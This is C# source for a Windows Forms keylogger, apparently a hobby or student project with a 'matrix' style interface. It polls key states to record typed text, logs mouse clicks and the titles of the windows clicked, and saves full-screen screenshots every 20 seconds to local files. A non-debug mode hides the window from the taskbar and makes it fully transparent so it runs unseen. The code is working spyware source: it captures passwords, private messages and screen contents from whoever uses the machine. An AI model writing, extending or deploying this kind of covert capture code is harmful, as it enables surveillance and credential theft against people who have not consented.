

namespace KeyloggerProject
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    public enum MouseButton
    {
        Left,
        Right,
        Middle
    }
    public partial class Form1 : Form
    {
        Timer matrixTimer = new Timer();
        Random matrixRand = new Random();
        int lineCount = 0;
        int maxLines = 50;

        Timer glowTimer = new Timer();
        int glowStep = 0;
        private bool isLogging = false;
        private DateTime lastMouseMoveTime = DateTime.MinValue;
        private POINT lastMousePos;
        Timer liveLogTimer = new Timer();
        private DateTime lastScreenshotTime = DateTime.MinValue;
        private int screenshotIntervalSeconds = 20;
        private string currentText = "";
        private bool isClosing = false;
        private Dictionary<Keys, DateTime> keyLastPressed = new Dictionary<Keys, DateTime>();
        private Dictionary<MouseButton, DateTime> mouseLastPressed = new Dictionary<MouseButton, DateTime>();
        private DateTime lastWindowClickTime = DateTime.MinValue;
        private int keyRepeatDelayMs = 150;
        private int windowClickDelayMs = 500;


        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;
        }

        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);




        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        Timer timer;
        StreamWriter sw;
        StreamWriter HELP;

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(Point p);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);





        public Form1()
        {
            bool debugMode = true; // or false (whatever we want to check)
            liveLogTimer.Interval = 1000; // every secound 
            liveLogTimer.Tick += LiveLogTimer_Tick;
            liveLogTimer.Start();

            matrixTimer.Interval = 100;
            matrixTimer.Tick += MatrixTimer_Tick;
            matrixTimer.Start();


            if (!debugMode)
            {
                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
                this.Opacity = 0;
            }
            else
            {
                this.Text = "Keylogger Monitor";
            }

            InitializeComponent();
            SetupGlow();


            timer = new Timer();
            timer.Interval = 10;
            timer.Tick += Timer_Tick;

            sw = new StreamWriter("keylog.txt", false);
            HELP = new StreamWriter("Help.txt", false);

        }
        private void CheckMouseClick(MouseButton button, int keyCode, DateTime now)
        {
            // Check if the mouse button is currently pressed
            if ((GetAsyncKeyState(keyCode) & 0x8000) != 0)
            {
                // Enforce a delay between clicks to avoid duplicate logging
                if (!mouseLastPressed.ContainsKey(button) || (now - mouseLastPressed[button]).TotalMilliseconds >= keyRepeatDelayMs)
                {
                    mouseLastPressed[button] = now;

                    // If the program is closing or the writer is unavailable, stop here
                    if (isClosing || sw == null) return;

                    // Log the button click with timestamp
                    sw.Write(Environment.NewLine + $"{button} mouse button clicked at {now}{Environment.NewLine}");

                    // If the button is the left mouse button, identify the window under the cursor
                    if (button == MouseButton.Left)
                    {
                        POINT pt;
                        if (GetCursorPos(out pt))
                        {
                            IntPtr hWnd = WindowFromPoint(new Point(pt.X, pt.Y));
                            StringBuilder windowText = new StringBuilder(256);
                            GetWindowText(hWnd, windowText, 256);

                            // Log the window title if enough time has passed since the last log
                            if (!string.IsNullOrWhiteSpace(windowText.ToString()) &&
                                (now - lastWindowClickTime).TotalMilliseconds >= windowClickDelayMs)
                            {
                                sw.Write($"Clicked on: {windowText}{Environment.NewLine}");
                                lastWindowClickTime = now;
                            }
                        }
                    }

                    // Flush the stream to ensure everything is written immediately
                    sw.Flush();
                }
            }
        }

        private void CheckMouseClicks()
        {
            DateTime now = DateTime.Now;

            CheckMouseClick(MouseButton.Left, 0x01, now);
            CheckMouseClick(MouseButton.Right, 0x02, now);
            CheckMouseClick(MouseButton.Middle, 0x04, now);
        }
        private void Timer_Tick(object sender, EventArgs e)
        {
            DateTime now = DateTime.Now;

            bool isShiftPressed =
              (GetAsyncKeyState((int)Keys.LShiftKey) & 0x8001) != 0 ||
              (GetAsyncKeyState((int)Keys.RShiftKey) & 0x8001) != 0;
            bool useUpperCase = isShiftPressed ^ Console.CapsLock;

            for (int i = 0; i < 255; i++)
            {
                int state = GetAsyncKeyState(i);
                Keys key = (Keys)i;

                if ((state & 0x8000) != 0)
                {
                    if (!keyLastPressed.ContainsKey(key) || (now - keyLastPressed[key]).TotalMilliseconds >= keyRepeatDelayMs)
                    {
                        keyLastPressed[key] = now;

                        if (key == Keys.Back && currentText.Length > 0)
                        {
                            currentText = currentText.Substring(0, currentText.Length - 1);
                        }
                        else if (key == Keys.Space)
                        {
                            currentText += " ";
                        }
                        else if (key == Keys.Enter)
                        {
                            currentText += Environment.NewLine;
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9) && isShiftPressed)
                        {
                            currentText += GetShiftSymbol(key);
                        }
                        else if ((key >= Keys.D0 && key <= Keys.D9))
                        {
                            currentText += ConvertKey(key);
                        }
                        else if (key >= Keys.A && key <= Keys.Z)
                        {
                            string letter = ConvertUpperLower(key, useUpperCase);
                            currentText += letter;


                        }
                        // Special character handling
                        else if (key == Keys.Oem1) // ; or :
                        {
                            currentText += isShiftPressed ? ":" : ";";
                        }
                        else if (key == Keys.Oem2) // / or ?
                        {
                            currentText += isShiftPressed ? "?" : "/";
                        }

                        sw.Write(currentText);
                        sw.Flush();
                        currentText = "";
                    }
                }
            }
            CheckMouseClicks();
            if ((DateTime.Now - lastScreenshotTime).TotalSeconds >= screenshotIntervalSeconds)
            {
                TakeScreenshot();
                lastScreenshotTime = DateTime.Now;
            }
            if ((GetAsyncKeyState((int)Keys.Escape) & 0x8000) != 0)
            {
                isClosing = true;
                this.Close();
                return;
            }
        }

        private string GetShiftSymbol(Keys key)
        {
            switch (key)
            {
                case Keys.D1: return "!";
                case Keys.D2: return "@";
                case Keys.D3: return "#";
                case Keys.D4: return "$";
                case Keys.D5: return "%";
                case Keys.D6: return "^";
                case Keys.D7: return "&";
                case Keys.D8: return "*";
                case Keys.D9: return "(";
                case Keys.D0: return ")";
                default: return "";
            }
        }


        private string ConvertKey(Keys key)
        {
            if (key >= Keys.D0 && key <= Keys.D9)
                return ((char)('0' + (key - Keys.D0))).ToString();

            return key.ToString();
        }
        private string ConvertUpperLower(Keys key, bool toUpper)
        {
            if (key >= Keys.A && key <= Keys.Z)
            {
                char baseChar = (char)('a' + (key - Keys.A));
                return toUpper ? char.ToUpper(baseChar).ToString() : baseChar.ToString();
            }

            return "";

        }
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            sw?.Close();
            matrixTimer?.Stop();
            base.OnFormClosed(e);
        }

        private void TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    string filename = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                    bitmap.Save(filename);
                    sw.Write($"Screenshot taken: {filename}{Environment.NewLine}");
                    sw.Flush();
                }
            }
            catch (Exception ex)
            {
                sw.Write($"Error taking screenshot: {ex.Message}{Environment.NewLine}");
                sw.Flush();
            }
            HELP.Write("Logging starts when the user presses the start button. it stops when the user presses the ESC key or stop button");
            HELP.Flush();
        }




        //-------------------------------------------------------GUI
        private void label1_Click(object sender, EventArgs e)
        {

        }


        private void SetupGlow()
        {
            glowTimer.Interval = 100;
            glowTimer.Tick += GlowTimer_Tick;
            glowTimer.Start();
        }

        private void GlowTimer_Tick(object sender, EventArgs e)
        {
            Color[] cyberGreens = new Color[]
            {
        Color.LimeGreen,
        Color.MediumSpringGreen,
        Color.Chartreuse,
        Color.SpringGreen,
        Color.LawnGreen
            };

            glowStep++;
        }


        private void btnToggleLogging_Click(object sender, EventArgs e)
        {
            isLogging = !isLogging;

            if (isLogging)
            {
                timer.Start();
                labelLogStatus.Text = "Logging: ON";
                labelLogStatus.ForeColor = Color.LimeGreen;
                btnToggleLogging.Text = "Stop Logging";
            }
            else
            {
                timer.Stop();
                labelLogStatus.Text = "Logging: OFF";
                labelLogStatus.ForeColor = Color.Red;
                btnToggleLogging.Text = "Start Logging";
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private void LiveLogTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                if (File.Exists("keylog.txt"))
                {
                    using (FileStream fs = new FileStream("keylog.txt", FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    using (StreamReader sr = new StreamReader(fs))
                    {
                        textBoxLiveLog.Text = sr.ReadToEnd();
                        textBoxLiveLog.SelectionStart = textBoxLiveLog.Text.Length;
                        textBoxLiveLog.ScrollToCaret();
                    }
                }
            }
            catch (IOException) { /* */ }
        }

        private void MatrixTimer_Tick(object sender, EventArgs e)
        {
            if (textBoxMatrix == null || textBoxMatrix.IsDisposed)
                return;

            try
            {
                string line = "";
                for (int i = 0; i < 60; i++)
                {
                    char c = (char)matrixRand.Next(33, 126);
                    line += c;
                }

                textBoxMatrix.AppendText(line + Environment.NewLine);
                lineCount++;

                if (lineCount >= maxLines)
                {
                    textBoxMatrix.Clear();
                    lineCount = 0;
                }

                textBoxMatrix.SelectionStart = textBoxMatrix.Text.Length;
                textBoxMatrix.ScrollToCaret();
            }
            catch (ObjectDisposedException) { }



        }

        
    }
}

